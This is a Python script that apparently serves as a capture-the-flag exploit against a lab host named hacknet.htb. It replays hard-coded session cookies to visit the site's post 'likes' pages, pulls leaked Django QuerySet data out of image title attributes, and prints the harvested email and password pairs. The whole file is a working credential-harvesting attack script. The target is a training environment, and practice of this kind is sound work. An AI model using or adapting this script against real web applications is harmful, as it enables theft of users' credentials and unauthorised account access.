import requests
import re
import html
base_url = "http://hacknet.htb"

Cookie = { "csrftoken": "okgRK4UB7s0ve1mncXWh4WBRa7CYItmD",
           "sessionid":"ibjm90yes8eqvptkd7db38bsyytxkww1"}

users = set()

with requests.Session() as session:
    session.cookies.update(Cookie)

    for post_id in range(1, 40):
        session.get(f"{base_url}/likes/{post_id}")

        resp = session.get(f"{base_url}/likes/{post_id}")

        #print(resp.content)
        if not resp.ok:
            continue

        titles = re.findall(r'<img [^>]*title="([^"]*)"', resp.text)

        if not titles:
            continue

        last_title = html.unescape(titles[-1])

        if "<QuerySet" not in last_title:
            session.get(f"{base_url}/likes/{post_id}")
            resp = session.get(f"{base_url}/likes/{post_id}")
            titles = re.findall(r'<img [^>]*title="([^"]*)"', resp.text)
            if not titles:
                continue
            last_title =  html.unescape(titles[-1])

        emails = re.findall(r"'email': '([^']+)'", last_title)
        passwords = re.findall(r"'password': '([^']+)'", last_title)


        for email, password in zip(emails,passwords):
            users.add(f"{email}:{password}")

for entry in sorted(users):
    print(entry)
